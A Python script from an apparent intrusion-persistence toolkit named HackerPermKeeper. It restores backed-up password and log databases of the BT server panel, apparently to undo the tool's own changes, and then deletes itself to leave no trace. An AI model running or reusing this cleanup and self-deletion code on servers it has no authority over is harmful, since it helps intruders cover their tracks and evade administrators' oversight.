# -*- coding: utf-8 -*-
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import sys
import re
import os
import sqlite3


def ml(command, input_data=None):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)

    # 如果有输入数据，将其写入子进程的stdin
    if input_data is not None:
        input_data = input_data.encode('utf-8')
        process.stdin.write(input_data)
        process.stdin.flush()

    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def color_title(value):  # 92m 绿色  94m蓝色
    print('\033[92m[+]\033[0m------------------------------------\033[94m{}\033[0m'.format(value))


def color(title=None, value=None):  # 93m 紫色
    if title is not None and value is not None:
        print("\033[93m[+]\033[0m{}: {}".format(title, value))
    else:
        print("\033[93m[+]\033[0m{}".format(title))


def color_red(title=None, value=None):  # 红色
    if title is not None and value is not None:
        print("\033[31m[+]\033[0m{}: {}".format(title, value))
    else:
        print("\033[31m[+]\033[0m{}".format(title))


def bar_bt_sql():
    file = [
        "/www/server/panel/data/db/panel.db",
        "/www/server/panel/data/db/default.db",
        "/www/server/panel/data/default.db",
        "/www/server/panel/data/db/log.db",
    ]
    if os.path.exists(file[0]) and os.path.isfile(file[1]) and os.path.isfile(file[2]) and os.path.isfile(
            file[3]):  # 新的版本
        if os.path.exists(file[0] + ".bar"):
            ml('cp {} {} && rm -rf {}'.format(file[0] + ".bar", file[0], file[0] + ".bar"))
            ml('cp {} {} && rm -rf {}'.format(file[3] + ".bar", file[3], file[3] + ".bar"))
            color_red(file[0])
            color_red(file[3])
    elif not os.path.exists(file[0]) and not os.path.isfile(file[1]) and os.path.isfile(file[2]) and not os.path.isfile(
            file[3]):
        if os.path.exists(file[2] + ".bar"):
            ml('cp {} {} && rm -rf {}'.format(file[2] + ".bar", file[2], file[2] + ".bar"))
            color_red(file[2])
    color("密码，日志恢复成功，请手动退出面板")


def delete_current_script():
    try:
        script_paths = os.path.abspath(sys.argv[0])
        os.remove(script_paths)
        print("当前脚本文件已成功删除" + script_paths)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    print('---------------------{\033[95m[+]HackerPermKeeper\033[0m v7.0}-------------')
    bar_bt_sql()
    delete_current_script()
